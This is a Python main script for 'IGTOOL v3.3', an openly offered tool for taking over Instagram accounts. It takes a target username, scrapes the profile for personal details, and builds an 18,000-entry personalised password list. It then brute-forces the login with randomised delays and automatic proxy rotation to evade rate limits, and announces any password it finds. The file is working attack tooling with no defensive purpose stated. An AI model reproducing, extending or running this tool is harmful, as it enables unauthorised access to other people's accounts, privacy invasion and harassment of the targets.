#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IGTOOL v3.3 — Only asks for username.
Proxy auto-fetch + failover fully automatic.
"""
import os, sys
from core.banner import C, show_banner, clear, info, ok, warn, err, step, ask, yesno, menu
from core.osint import OSINT
from core.interviewer import Interviewer
from core.wordlist import WordlistAI
from core.brute import BruteEngine
from core.api import InstagramAPI

OUTPUT_DIR = "output"
DEFAULT_WL_SIZE = 18000
DEFAULT_DELAY_MIN = 3.0
DEFAULT_DELAY_MAX = 5.0


def count_lines(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for ln in f if ln.strip())
    except Exception:
        return 0


def lists_or(*vals):
    for v in vals:
        if v is None:
            continue
        if isinstance(v, list):
            return v
        if v:
            return v
    return []


def merge_hints(answers, hints, username):
    answers = dict(answers or {})
    hints = hints or {}
    answers["username"] = answers.get("username") or username
    answers["full_name"] = answers.get("full_name") or hints.get("full_name", "")
    answers["biography"] = hints.get("biography", answers.get("biography", ""))
    answers["bio_tokens"] = lists_or(hints.get("bio_tokens"), [])
    answers["osint_tokens"] = lists_or(hints.get("bio_tokens"), [])
    answers["osint_years"] = lists_or(hints.get("years"), [])
    answers["years"] = lists_or(hints.get("years"), [])
    answers["phones"] = lists_or(hints.get("phones"), answers.get("phones"), [])
    answers["osint_phones"] = lists_or(hints.get("phones"), [])
    answers["user_parts"] = lists_or(hints.get("user_parts"), [])
    answers["stat_numbers"] = lists_or(hints.get("stat_numbers"), [])
    answers["followers"] = hints.get("followers", 0)
    answers["following"] = hints.get("following", 0)
    answers["posts"] = hints.get("posts", 0)
    answers["category"] = hints.get("category", "")
    answers["external_url"] = hints.get("external_url", "")
    return answers


def run_osint(username, proxy):
    sid = os.environ.get("IG_SESSIONID") or None
    bot = OSINT(username, OUTPUT_DIR, proxy, sessionid=sid)
    data = bot.scrape()
    hints = bot.get_hints() if bot.data else {"username": username}
    hints["username"] = hints.get("username") or username
    return bot, data, hints


def gen_dict(answers, username, count=DEFAULT_WL_SIZE):
    path = os.path.join(OUTPUT_DIR, username, "wordlist.txt")
    ai = WordlistAI(answers, target_count=count)
    info(f"Building targeted dictionary → {count} passwords...")
    ai.generate()
    ai.save(path)
    ok(ai.report())
    ok(f"Saved → {path}")
    sample = sorted(ai.passwords)[:10]
    if sample:
        print(f"\n{C.W}Sample:{C.E}")
        for s in sample:
            print(f"  • {s}")
    return path, ai.count


def wl_path(username):
    return os.path.join(OUTPUT_DIR, username, "wordlist.txt")


def main():
    clear()
    show_banner()

    print(f"{C.W}── Setup ──{C.E}\n")

    # ═══════════════════════════════════
    # ONLY 1 QUESTION: username
    # ═══════════════════════════════════
    username = ask("Instagram username").strip().lstrip("@")
    if not username:
        err("Username required")
        sys.exit(1)

    # ═══════════════════════════════════
    # Auto-fetch proxies — no user input
    # ═══════════════════════════════════
    proxy = None
    proxy_file = None
    if os.path.isfile("proxies.txt"):
        proxy_file = "proxies.txt"
        info("Found proxies.txt (optional rotation)")

    os.makedirs(os.path.join(OUTPUT_DIR, username), exist_ok=True)

    info(f"Target : @{username}")
    info(f"Output : {OUTPUT_DIR}/{username}/")
    info(f"Proxy  : AUTO-FETCH (spys.one + 10 mirrors)")
    print()

    info("Checking target...")
    try:
        exists = InstagramAPI().profile_exists(username)
        if exists is True:
            ok(f"@{username} reachable")
        elif exists is False:
            warn(f"@{username} may not exist — you can still continue")
        else:
            warn("Could not verify — continue anyway")
    except Exception:
        warn("Check skipped — continue")

    while True:
        choice = menu(
            [
                "OSINT — name, bio, followers, posts, private/public",
                "DICTIONARY — interview → 18000 passwords",
                "BRUTE FORCE — live progress + auto proxy failover",
                "FULL ATTACK — OSINT → Interview → Dict → Brute",
                "RESUME — continue previous brute",
                "EXIT",
            ],
            f"@ {username}  |  proxy: AUTO-FETCH",
        )

        if choice == 1:
            step(1, 1, "OSINT")
            _, data, _ = run_osint(username, None)
            if data:
                ok(f"Saved → {OUTPUT_DIR}/{username}/osint.json")
            else:
                warn("OSINT limited — use DICTIONARY + interview")
            ask("ENTER")
            clear()
            show_banner()
            continue

        if choice == 2:
            step(1, 2, "OSINT (auto, quiet if fails)")
            try:
                _, _, hints = run_osint(username, None)
            except Exception:
                hints = {"username": username}
                warn("OSINT skipped")
            if not hints:
                hints = {"username": username}
            step(2, 2, "INTERVIEW → dictionary")
            answers = Interviewer(username, hints, OUTPUT_DIR).run()
            answers = merge_hints(answers, hints, username)
            gen_dict(answers, username, DEFAULT_WL_SIZE)
            ask("\nENTER")
            clear()
            show_banner()
            continue

        if choice == 3:
            path = wl_path(username)
            if not os.path.isfile(path) or count_lines(path) == 0:
                warn("No dictionary yet — building now")
                try:
                    _, _, hints = run_osint(username, None)
                except Exception:
                    hints = {"username": username}
                answers = Interviewer(username, hints, OUTPUT_DIR).run()
                answers = merge_hints(answers, hints, username)
                path, _ = gen_dict(answers, username, DEFAULT_WL_SIZE)
            n = count_lines(path)
            print(f"\n{C.R}  {n} passwords → @{username}{C.E}")
            if not yesno("Start brute?", default_yes=True):
                continue
            found = BruteEngine(username, path, OUTPUT_DIR, delay_min=DEFAULT_DELAY_MIN,
                                delay_max=DEFAULT_DELAY_MAX, proxy_file=proxy_file).run()
            if found:
                print(f"\n{C.G}{'═' * 42}{C.E}")
                print(f"{C.G}  PASSWORD FOUND: {found}{C.E}")
                print(f"{C.G}  Saved: {OUTPUT_DIR}/{username}/found.txt{C.E}")
                print(f"{C.G}{'═' * 42}{C.E}")
            ask("\nENTER")
            clear()
            show_banner()
            continue

        if choice == 4:
            step(1, 3, "OSINT")
            try:
                _, _, hints = run_osint(username, None)
            except Exception:
                hints = {"username": username}
            step(2, 3, "INTERVIEW + DICTIONARY")
            answers = Interviewer(username, hints, OUTPUT_DIR).run()
            answers = merge_hints(answers, hints, username)
            path, cnt = gen_dict(answers, username, DEFAULT_WL_SIZE)
            step(3, 3, "BRUTE FORCE")
            print(f"\n{C.R}  {cnt} passwords → @{username}{C.E}")
            if not yesno("Start brute?", default_yes=True):
                warn("Dictionary saved — brute skipped")
                ask("ENTER")
                clear()
                show_banner()
                continue
            found = BruteEngine(username, path, OUTPUT_DIR, delay_min=DEFAULT_DELAY_MIN,
                                delay_max=DEFAULT_DELAY_MAX, proxy_file=proxy_file).run()
            if found:
                print(f"\n{C.G}  PASSWORD FOUND: {found}{C.E}")
            ask("\nENTER")
            clear()
            show_banner()
            continue

        if choice == 5:
            prog = os.path.join(OUTPUT_DIR, username, "progress.json")
            path = wl_path(username)
            if not os.path.isfile(prog):
                err("Nothing to resume")
                ask("ENTER")
                continue
            if not os.path.isfile(path):
                err("wordlist.txt missing")
                ask("ENTER")
                continue
            info("Resuming...")
            found = BruteEngine(username, path, OUTPUT_DIR, delay_min=DEFAULT_DELAY_MIN,
                                delay_max=DEFAULT_DELAY_MAX, proxy_file=proxy_file, resume=True).run()
            if found:
                print(f"\n{C.G}  PASSWORD FOUND: {found}{C.E}")
            ask("\nENTER")
            clear()
            show_banner()
            continue

        if choice == 6:
            print(f"\n{C.C}  Bye.{C.E}\n")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] stopped{C.E}")
        sys.exit(0)
